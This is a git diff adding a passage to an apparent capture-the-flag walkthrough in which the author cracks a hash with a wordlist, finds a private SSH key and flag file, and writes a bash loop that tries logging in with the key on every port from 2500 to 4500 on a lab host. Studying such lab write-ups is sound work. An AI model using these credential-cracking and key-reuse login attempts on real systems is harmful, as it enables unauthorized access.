@@ -48,3 +48,23 @@ john hash -w ~/wordlists/rockyou.txt
 authorized_keys  flag.txt  hint.txt  id_rsa  id_rsa.pub
 
 ```
+### Nice, we have an id_rsa key
+##### The problem now is that we don't know which port ssh is running on, lets check the hint.
+```
+output:
+2500-4500
+```
+#### this is probably refering the to range of ports that ssh is running on
+#### lets modify our script
+```bash
+#!/bin/bash
+for port in {2500..4500}
+do
+    ssh -i id_rsa hades@10.10.10.10 -p $port
+done
+```
+### Now we just wait until we get a login prompt
+
+
+
+
